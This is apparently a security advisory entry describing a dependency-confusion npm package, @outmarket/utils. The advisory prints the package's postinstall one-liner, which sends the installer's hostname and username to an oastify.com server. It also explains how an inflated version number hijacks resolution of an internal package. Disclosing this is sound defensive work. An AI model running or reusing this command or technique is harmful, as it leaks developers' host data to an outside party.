summary: Dependency-confusion package exfiltrates host identifiers to attacker server on install
details: On `npm install`, the package's postinstall script in package.json executes `node -e "require('https').get('https://e2hq3mdgl6npdxuzxdv449ehr8x1lt9i.oastify.com/?host='+require('os').hostname()+'&user='+require('os').userInfo().username)"`, sending the installer's hostname and OS username as query parameters to a Burp Collaborator (oastify.com) out-of-band server controlled by the publisher. The package self-identifies in its description and index.js as a dependency-confusion PoC targeting the @outmarket scope, and uses a 9.9.9 version designed to outrank a legitimate internal package of the same name during resolution from public npm. Any developer or build system that resolves @outmarket/utils from public npm will silently leak host identifiers to the attacker-controlled domain at install time. Regardless of the 'PENTEST-PoC' framing, publication on public npm makes this an active install-time exfiltration attack against any installer who pulls it.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
